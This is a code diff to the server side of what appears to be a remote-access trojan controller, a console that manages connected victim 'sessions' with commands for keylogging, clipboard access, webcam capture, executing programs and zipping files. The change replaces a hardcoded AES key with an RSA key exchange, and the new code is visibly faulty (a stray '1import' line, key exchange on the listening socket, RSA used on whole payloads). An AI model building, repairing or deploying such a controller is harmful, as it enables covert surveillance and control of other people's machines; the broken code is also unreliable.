@@ -4,11 +4,12 @@ import base64
 import socket
 import json
 import threading
-import os
-import argparse
+1import argparse
 import math
 # non-standard libraries
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.exceptions import InvalidTag
 import texttable
 import cmd2
@@ -231,9 +232,12 @@ class Connection:
 
         HOST = "127.0.0.1"
         PORT = 10001
-        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'
 
-        self.crypter = AESGCM(KEY)
+        self.privkey = rsa.generate_private_key(public_exponent=65537,
+                                                key_size=2048,
+                                                backend=default_backend())
+        self.pubkey_pem = self.privkey.public_key().public_bytes(encoding=serialization.Encoding.PEM,
+                                                                 format=serialization.PublicFormat.SubjectPublicKeyInfo)
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -265,13 +269,21 @@ class Connection:
                 if address in self.blocked_ips:
                     connection.close()
                 else:
+                    client_pubkey = self.exchange_keys(connection)
                     self.user_interface.async_alert("[*] client connected")
                     session = {"connection": connection,
                                "address": address,
                                "port": port,
                                "tag": "no tag",
-                               "groups": {"all"}}
+                               "groups": {"all"},
+                               "pubkey": client_pubkey}
                     self.sessions.append(session)
+
+    def exchange_keys(self, connection):
+        self.sock.sendall(self.pubkey_pem)
+        pem = self.sock.recv(self.PACKET_SIZE) + self.sock.recv(self.PACKET_SIZE)
+        pubkey = serialization.load_pem_public_key(pem, default_backend())
+        return pubkey
 
     # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
     def format_byte_length(self, num, suffix='B'):
@@ -283,14 +295,14 @@ class Connection:
 
     def send(self, data: dict, connection):
         self.sock.settimeout(self.user_interface.sock_timeout)
-        data = self.encrypt(json.dumps(data).encode(self.CODEC))
+        data = self.encrypt(json.dumps(data).encode(self.CODEC), self.get_pubkey_by_connection(connection))
         len_data_total = len(data)
         total_packets = math.ceil(len_data_total / self.PACKET_SIZE)
         try:
             connection.sendall(str(len_data_total).encode("utf8"))
             connection.recv(self.PACKET_SIZE)
             for packet_number in range(total_packets):
-                connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
+                connection.sendall(data[packet_number * self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
                 sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
                 sys.stdout.flush()
                 print()
@@ -310,7 +322,7 @@ class Connection:
                 print()
             received_dict = json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
 
-        # check the received data
+            # check the received data
             for expected_key, expected_type in zip(expected_dict.keys(), expected_dict.values()):
                 if expected_key not in received_dict.keys() or type(received_dict[expected_key]) != expected_type:
                     return False, None
@@ -327,17 +339,27 @@ class Connection:
             self.user_interface.perror(f"ValueError from session {self.get_index_by_connection(connection)}")
         return False, None
 
-    def encrypt(self, data):
-        nonce = os.urandom(12)
-        return nonce + self.crypter.encrypt(nonce, data, b"")
+    def encrypt(self, data, pubkey):
+        return pubkey.encrypt(data,
+                              padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                           algorithm=hashes.SHA256(),
+                                           label=None))
 
     def decrypt(self, cipher):
-        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
+        return self.privkey.decrypt(cipher,
+                                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                                 algorithm=hashes.SHA256(),
+                                                 label=None))
 
     def get_index_by_connection(self, searched_connection):
         for index, session in enumerate(self.sessions):
             if searched_connection == session["connection"]:
                 return index
+
+    def get_pubkey_by_connection(self, searched_connection):
+        for session in self.sessions:
+            if searched_connection == session["connection"]:
+                return session["pubkey"]
 
 
 class UserInterface(cmd2.Cmd):
@@ -400,7 +422,8 @@ class UserInterface(cmd2.Cmd):
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     log_keys_parser = argparse.ArgumentParser(prog="clip")
-    log_keys_parser.add_argument("-c", "--content", default="", type=str, help="content to store to clipboard if provided")
+    log_keys_parser.add_argument("-c", "--content", default="", type=str,
+                                 help="content to store to clipboard if provided")
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     block_parser = argparse.ArgumentParser(prog="block")
@@ -428,7 +451,8 @@ class UserInterface(cmd2.Cmd):
         self.add_settable(cmd2.Settable("cmd_timeout", int, "clientside timeout before returning from a command",
                                         choices=range(3600)))
         self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file", choices=range(10)))
-        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data", choices=range(3600)))
+        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data",
+                                        choices=range(3600)))
         # delete some builtins
         del cmd2.Cmd.do_py
         del cmd2.Cmd.do_run_pyscript
@@ -476,7 +500,8 @@ class UserInterface(cmd2.Cmd):
     @cmd2.decorators.with_argparser(group_parser)
     def do_group(self, args):
         """Edit sessions groups memberships"""
-        self.server.edit_group(self.server.connection.get_conn_fgoi(args.add), self.server.connection.get_conn_fgoi(args.rm), args.groups)
+        self.server.edit_group(self.server.connection.get_conn_fgoi(args.add),
+                               self.server.connection.get_conn_fgoi(args.rm), args.groups)
 
     @cmd2.decorators.with_argparser(exe_parser)
     def do_exe(self, args):
@@ -501,7 +526,8 @@ class UserInterface(cmd2.Cmd):
     @cmd2.decorators.with_argparser(zip_parser)
     def do_zip(self, args):
         """Compress to zip archive"""
-        self.server.zip_file_or_folder(args.compression_level, args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+        self.server.zip_file_or_folder(args.compression_level, args.read, args.write,
+                                       self.server.connection.get_conn_fgoi(args.sessions))
 
     @cmd2.decorators.with_argparser(cam_parser)
     def do_cam(self, args):
